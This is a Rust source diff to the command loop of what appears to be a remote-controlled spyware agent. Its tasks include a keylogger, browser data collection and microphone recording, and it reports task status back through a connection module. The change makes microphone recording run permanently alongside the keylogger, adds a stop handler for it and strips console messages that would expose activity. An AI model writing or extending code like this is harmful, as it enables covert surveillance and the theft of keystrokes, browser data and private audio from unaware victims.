@@ -53,9 +53,8 @@ async fn main() {
         ("5", "browser_info"),
         ("6", "mic_rec"),
     ];
-    let mut stopped: HashSet<String> = HashSet::new();
     let mut already_executed: HashSet<String> = HashSet::new();
-    let always_run: [&'static str; 1] = ["keylogger"];
+    let always_run: [&'static str; 2] = ["keylogger", "mic_rec"];
     let mut running_tasks: HashSet<String> = HashSet::new();
 
     loop {
@@ -73,7 +72,9 @@ async fn main() {
                             if *cmd_name == "keylogger" {
                                 input::stop_keylogger();
                             }
-                            stopped.insert(cmd_name.to_string());
+                            if *cmd_name == "mic_rec" {
+                                mic_rec::stop_mic_rec();
+                            }
                             already_executed.remove(&cmd_name.to_string());
                             running_tasks.remove(&cmd_name.to_string());
                             let _ = connexion::send_directive_status(
@@ -87,13 +88,8 @@ async fn main() {
                         }
                         continue;
                     }
-                    if stopped.contains(&command) {
-                        println!("Commande stoppée ignorée: {}", command);
-                        continue;
-                    }
 
                     if always_run.contains(&command.as_str()) && running_tasks.contains(&command) {
-                        println!("{} est déjà en cours d'exécution", command);
                         continue;
                     }
 
